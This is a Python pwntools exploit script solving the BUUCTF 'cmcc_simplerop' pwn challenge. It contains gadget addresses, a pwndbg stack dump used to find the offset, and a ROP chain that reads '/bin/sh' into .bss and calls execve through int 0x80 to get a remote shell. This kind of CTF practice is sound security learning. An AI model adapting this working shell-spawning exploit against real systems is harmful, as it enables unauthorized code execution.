from pwn import *

context.os = 'linux'
context.arch = 'i386'
# context.log_level = 'debug'

io = remote('node4.buuoj.cn', 27009)

# TODO: ELF静态编译，没有Libc，这种题又是第一次见...

# 考虑通过系统调用的方式来获得shell
int_0x80 = 0x80493e1
pop_eax_ret = 0x80bae06
pop_ebx_ret = 0x80481c9
pop_ecx_ebx_ret =  0x806e851
pop_edx_ret = 0x806e82a
pop3_ret = 0x806e828
read_addr = 0x806cd50

bss_addr = 0x80eaf80

'''
=============================================================
ubuntu 16 gdb调试数据，偏移：0x118 - 0x0fc = 0x1c，IDA的结果0x14是不对的
=============================================================
pwndbg> stack 20
00:0000│ esp 0xffffd0e0 ◂— 0x0
01:0004│     0xffffd0e4 —▸ 0xffffd0fc ◂— 0x2
02:0008│     0xffffd0e8 ◂— 0x64 /* 'd' */
03:000c│     0xffffd0ec —▸ 0x80495d2 (__libc_csu_init+130) ◂— add    ebp, 1
04:0010│     0xffffd0f0 ◂— 0x1
05:0014│     0xffffd0f4 —▸ 0xffffd1a4 —▸ 0xffffd2de ◂— '/mnt/d/zyFiles/Learning/Interests/zyctf/myctf/BUUCTF/Pwn/cmcc_simplerop/simplerop'
06:0018│     0xffffd0f8 —▸ 0xffffd1ac —▸ 0xffffd330 ◂— 'WT_SESSION=9fd87ce3-dbe6-4d50-84d4-ef1a67f7aa72'
07:001c│ eax 0xffffd0fc ◂— 0x2
08:0020│     0xffffd100 —▸ 0x80ea074 (__exit_funcs) —▸ 0x80eb2a0 (initial) ◂— 0x0
09:0024│     0xffffd104 —▸ 0xffffd1a4 —▸ 0xffffd2de ◂— '/mnt/d/zyFiles/Learning/Interests/zyctf/myctf/BUUCTF/Pwn/cmcc_simplerop/simplerop'
0a:0028│     0xffffd108 —▸ 0xffffd1ac —▸ 0xffffd330 ◂— 'WT_SESSION=9fd87ce3-dbe6-4d50-84d4-ef1a67f7aa72'
0b:002c│     0xffffd10c —▸ 0x80481a8 (_init) ◂— push   ebx
0c:0030│     0xffffd110 ◂— 0x0
0d:0034│     0xffffd114 —▸ 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80677d0 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
0e:0038│ ebp 0xffffd118 —▸ 0x80495f0 (__libc_csu_fini) ◂— push   ebx
0f:003c│     0xffffd11c —▸ 0x804903a (__libc_start_main+458) ◂— mov    dword ptr [esp], eax
10:0040│     0xffffd120 ◂— 0x1
11:0044│     0xffffd124 —▸ 0xffffd1a4 —▸ 0xffffd2de ◂— '/mnt/d/zyFiles/Learning/Interests/zyctf/myctf/BUUCTF/Pwn/cmcc_simplerop/simplerop'
12:0048│     0xffffd128 —▸ 0xffffd1ac —▸ 0xffffd330 ◂— 'WT_SESSION=9fd87ce3-dbe6-4d50-84d4-ef1a67f7aa72'
13:004c│     0xffffd12c ◂— 0x0
'''

offset = 0x1c
payload = b'a'*(offset+4)+p32(read_addr) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(100) # read(0, bss, 8)
payload += p32(pop_eax_ret) + p32(11)
payload += p32(pop_ecx_ebx_ret) + p32(0) + p32(bss_addr)
payload += p32(pop_edx_ret) + p32(0) + p32(int_0x80)

io.send(payload)
io.send(b'/bin/sh\x00')

io.interactive()
